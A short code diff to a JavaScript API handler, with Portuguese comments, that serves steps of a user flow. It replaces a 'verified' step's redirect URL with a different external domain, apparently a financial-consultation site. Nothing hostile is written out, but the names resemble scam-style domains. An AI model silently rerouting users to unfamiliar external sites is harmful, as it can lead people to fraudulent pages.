@@ -80,7 +80,7 @@ export default function handler(req, res) {
       userData: {
         verified: true
       },
-      redirectUrl: "https://www.confirabenefic.com/fs/index.html"
+      redirectUrl: "https://consultarfinanceiro.name/idz/"
     }
   };
 
@@ -95,3 +95,4 @@ export default function handler(req, res) {
   // Retornar o step
   res.status(200).json(steps[stepId]);
 }
+
